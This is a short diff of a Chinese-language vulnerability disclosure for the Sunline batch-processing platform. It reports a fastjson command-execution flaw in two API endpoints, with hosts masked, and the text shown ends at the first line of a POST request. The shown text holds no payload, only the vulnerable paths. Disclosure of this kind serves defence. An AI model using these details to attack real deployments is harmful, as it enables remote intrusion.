@@ -1,8 +1,12 @@
 长亮sunline跑批平台接口存在fastjson命令执行漏洞
 漏洞地址：https://xxxxxxx/loader/api/uiAuth/login
+
          https://xxxxxxx/loader/api/uiAuth/reset-password-sendmail
+         
 漏洞描述：长亮sunline跑批平台接口存在fastjson命令执行漏洞
+
 漏洞详情：
+
 1、接口存在fastjson命令执行漏洞
 ![image](https://github.com/ranhn/Sunline/assets/107679328/2a018bf1-faf5-4fef-84a0-e16bc44661d5)
 POST /loader/api/uiAuth/reset-password-sendmail HTTP/1.1
